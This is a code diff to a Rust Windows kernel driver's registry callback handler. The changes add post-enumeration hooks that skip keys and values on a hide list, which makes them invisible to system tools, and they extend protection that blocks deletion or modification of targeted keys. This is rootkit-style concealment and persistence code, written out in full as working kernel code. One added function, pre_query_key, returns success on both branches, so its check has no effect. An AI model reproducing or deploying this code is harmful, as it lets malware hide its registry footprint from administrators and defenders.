@@ -1,19 +1,23 @@
 #![allow(non_upper_case_globals)]
 
 use {
-    crate::registry::Registry,
-    crate::utils::valid_kernel_memory,
-    alloc::string::String, 
-    core::{ffi::c_void, ptr::null_mut},
+    super::{
+        utils::{check_key_value, enumerate_value_key, RegistryInfo}, HIDE_KEYS, HIDE_KEY_VALUES, TARGET_KEYS, TARGET_KEY_VALUES
+    }, 
+    crate::{
+        registry::{utils::{check_key, enumerate_key}, Registry}, 
+        utils::valid_kernel_memory
+    }, 
+    alloc::{format, string::String}, 
+    core::{ffi::c_void, ptr::null_mut}, 
     wdk_sys::{
-        *,
         ntddk::{
-            CmCallbackGetKeyObjectIDEx, CmCallbackReleaseKeyObjectIDEx
-        }, 
-        _REG_NOTIFY_CLASS::{
-            RegNtPreDeleteKey, RegNtPreDeleteValueKey, RegNtPreSetValueKey
-        }
-    }
+            CmCallbackGetKeyObjectIDEx, CmCallbackReleaseKeyObjectIDEx,
+            ExAllocatePool2, ExFreePool, ObOpenObjectByPointer, ZwClose
+        }, _MODE::KernelMode, _REG_NOTIFY_CLASS::{
+            RegNtPostEnumerateKey, RegNtPostEnumerateValueKey, RegNtPreDeleteKey, RegNtPreDeleteValueKey, RegNtPreQueryKey, RegNtPreSetValueKey
+        }, *
+    },
 };
 
 /// Handle for Registry Callback
@@ -46,6 +50,15 @@ pub unsafe extern "C" fn registry_callback(
         },
         RegNtPreDeleteKey => {
             status = pre_delete_key(argument2 as *mut REG_DELETE_KEY_INFORMATION);
+        },
+        RegNtPreQueryKey => {
+            status = pre_query_key(argument2 as *mut REG_QUERY_KEY_INFORMATION);
+        },
+        RegNtPostEnumerateKey => {
+            status = post_enumerate_key(argument2 as *mut REG_POST_OPERATION_INFORMATION);
+        },
+        RegNtPostEnumerateValueKey => {
+            status = post_enumerate_key_value(argument2 as *mut REG_POST_OPERATION_INFORMATION);
         }
         _ => return STATUS_SUCCESS,
     }
@@ -72,8 +85,182 @@ unsafe fn pre_delete_key(info: *mut REG_DELETE_KEY_INFORMATION) -> NTSTATUS {
         Err(err) => return err
     };
 
-    status = if Registry::check_key(key) {
+    status = if Registry::check_key(key, TARGET_KEYS.lock()) {
         STATUS_ACCESS_DENIED
+    } else {
+        STATUS_SUCCESS
+    };
+
+    status
+}
+
+/// Performs the post-operation to enumerate registry key values.
+///
+/// # Parameters
+/// - `info`: Pointer to the information structure of the post-execution logging operation.
+///
+/// # Return
+/// - `NTSTATUS`: Returns the status of the operation. If the key value is found and handled correctly, returns `STATUS_SUCCESS`.
+/// 
+unsafe fn post_enumerate_key_value(info: *mut REG_POST_OPERATION_INFORMATION) -> NTSTATUS {
+    if !NT_SUCCESS((*info).Status) {
+        return (*info).Status
+    }
+
+    let key = match read_key(info) {
+        Ok(key) => key,
+        Err(err) => return err
+    };
+
+    if !check_key_value(info, key.clone()) {
+        return STATUS_SUCCESS
+    }
+
+    let pre_info = match ((*info).PreInformation as *mut REG_ENUMERATE_VALUE_KEY_INFORMATION).as_ref() {
+        Some(pre_info) => pre_info,
+        None => return STATUS_SUCCESS,
+    };
+
+    let mut key_handle = null_mut();
+    let status = ObOpenObjectByPointer(
+        (*info).Object,
+        OBJ_KERNEL_HANDLE,
+        null_mut(),
+        KEY_ALL_ACCESS,
+        *CmKeyObjectType,
+        KernelMode as i8,
+        &mut key_handle
+    );
+
+    if !NT_SUCCESS(status) {
+        log::error!("ObOpenObjectByPointer Failed With Status: {status}");
+        return STATUS_SUCCESS;
+    }
+
+    let buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, (*pre_info).Length as u64, u32::from_be_bytes(*b"jdrf")) as *mut u8;
+    if buffer.is_null() {
+        ZwClose(key_handle);
+        return STATUS_SUCCESS;
+    }
+
+    let mut result_length = 0;
+    let mut counter = 0;
+
+    while let Some(value_name) = enumerate_value_key(key_handle, pre_info.Index + counter, buffer, (*pre_info).Length, (*pre_info).KeyValueInformationClass, &mut result_length) {
+        if !Registry::check_target(key.clone(), value_name.clone(), HIDE_KEY_VALUES.lock()) {
+            if let Some(pre_info_key_info) = (pre_info.KeyValueInformation as *mut c_void).as_mut() {
+                *(*pre_info).ResultLength = result_length;
+                core::ptr::copy_nonoverlapping(buffer, pre_info_key_info as *mut _ as *mut u8, result_length as usize);
+                break;
+            } else {
+                log::error!("Failed to copy key information.");
+                break;
+            }
+        } else {
+            counter += 1;
+        }
+    }
+
+    ZwClose(key_handle);
+    ExFreePool(buffer as _);
+    STATUS_SUCCESS
+}
+
+/// Performs the post-operation to enumerate registry keys.
+///
+/// # Parameters
+/// - `info`: Pointer to the information structure of the post-execution logging operation.
+///
+/// # Return
+/// - `NTSTATUS`: Returns the status of the operation, keeping the original status if the previous operation failed.
+/// 
+unsafe fn post_enumerate_key(info: *mut REG_POST_OPERATION_INFORMATION) -> NTSTATUS {
+    if !NT_SUCCESS((*info).Status) {
+        return (*info).Status
+    }
+
+    let key = match read_key(info) {
+        Ok(key) => key,
+        Err(err) => return err
+    };
+
+    if !check_key(info, key.clone()) {
+        return STATUS_SUCCESS
+    }
+
+    let pre_info = match ((*info).PreInformation as *mut REG_ENUMERATE_KEY_INFORMATION).as_ref() {
+        Some(pre_info) => pre_info,
+        None => return STATUS_SUCCESS,
+    };
+
+    let mut key_handle = null_mut();
+    let status = ObOpenObjectByPointer(
+        (*info).Object,
+        OBJ_KERNEL_HANDLE,
+        null_mut(),
+        KEY_ALL_ACCESS,
+        *CmKeyObjectType,
+        KernelMode as i8,
+        &mut key_handle
+    );
+
+    if !NT_SUCCESS(status) {
+        log::error!("ObOpenObjectByPointer Failed With Status: {status}");
+        return STATUS_SUCCESS;
+    }
+
+    let buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, (*pre_info).Length as u64, u32::from_be_bytes(*b"jdrf")) as *mut u8;
+    if buffer.is_null() {
+        ZwClose(key_handle);
+        return STATUS_SUCCESS;
+    }
+
+    let mut result_length = 0;
+    let mut counter = 0;
+
+    while let Some(key_name) = enumerate_key(key_handle, pre_info.Index + counter, buffer, (*pre_info).Length, (*pre_info).KeyInformationClass, &mut result_length) {
+        let key_format = format!("{key}\\{key_name}");
+        if !Registry::check_key(key_format, HIDE_KEYS.lock()) {
+            if let Some(pre_info_key_info) = (pre_info.KeyInformation as *mut c_void).as_mut() {
+                *(*pre_info).ResultLength = result_length;
+                core::ptr::copy_nonoverlapping(buffer, pre_info_key_info as *mut _ as *mut u8, result_length as usize);
+                break;
+            } else {
+                log::error!("Failed to copy key information.");
+                break;
+            }
+
+        } else {
+            counter += 1;
+        }
+    }
+
+    ZwClose(key_handle);
+    ExFreePool(buffer as _);
+    STATUS_SUCCESS
+}
+
+/// Handles the pre-query key operation.
+///
+/// # Parameters
+/// - `info`: A pointer to `REG_QUERY_KEY_INFORMATION`.
+///
+/// # Returns
+/// - `NTSTATUS`: A status code indicating success or failure.
+/// 
+unsafe fn pre_query_key(info: *mut REG_QUERY_KEY_INFORMATION) -> NTSTATUS {
+    let status;
+    if info.is_null() || (*info).Object.is_null() || !valid_kernel_memory((*info).Object as u64) {
+        return STATUS_SUCCESS;
+    }
+
+    let key = match read_key(info) {
+        Ok(key) => key,
+        Err(err) => return err
+    };
+
+    status = if Registry::check_key(key.clone(), HIDE_KEYS.lock()) {
+        STATUS_SUCCESS
     } else {
         STATUS_SUCCESS
     };
@@ -106,7 +293,7 @@ unsafe fn pre_delete_value_key(info: *mut REG_DELETE_VALUE_KEY_INFORMATION) -> N
 
     let buffer = core::slice::from_raw_parts((*value_name).Buffer, ((*value_name).Length / 2) as usize);
     let name = String::from_utf16_lossy(buffer);
-    if Registry::check_target(key.clone(), name.clone()) {
+    if Registry::<(String, String)>::check_target(key.clone(), name.clone(), TARGET_KEY_VALUES.lock()) {
         STATUS_ACCESS_DENIED
     } else {
         STATUS_SUCCESS
@@ -138,7 +325,7 @@ unsafe fn pre_set_value_key(info: *mut REG_SET_VALUE_KEY_INFORMATION) -> NTSTATU
 
     let buffer = core::slice::from_raw_parts((*value_name).Buffer,((*value_name).Length / 2) as usize);
     let name = String::from_utf16_lossy(buffer);
-    if Registry::check_target(key.clone(), name.clone()) {
+    if Registry::check_target(key.clone(), name.clone(), TARGET_KEY_VALUES.lock()) {
         STATUS_ACCESS_DENIED
     } else {
         STATUS_SUCCESS
@@ -178,27 +365,4 @@ unsafe fn read_key<T: RegistryInfo>(info: *mut T) -> Result<String, NTSTATUS> {
     CmCallbackReleaseKeyObjectIDEx(reg_path);
 
     Ok(name)
-}
-
-/// Trait for accessing the object in registry information.
-trait RegistryInfo {
-    fn get_object(&self) -> *mut c_void;
-}
-
-impl RegistryInfo for REG_DELETE_KEY_INFORMATION {
-    fn get_object(&self) -> *mut c_void {
-        self.Object
-    }
-}
-
-impl RegistryInfo for REG_DELETE_VALUE_KEY_INFORMATION {
-    fn get_object(&self) -> *mut c_void {
-        self.Object
-    }
-}
-
-impl RegistryInfo for REG_SET_VALUE_KEY_INFORMATION {
-    fn get_object(&self) -> *mut c_void {
-        self.Object
-    }
 }
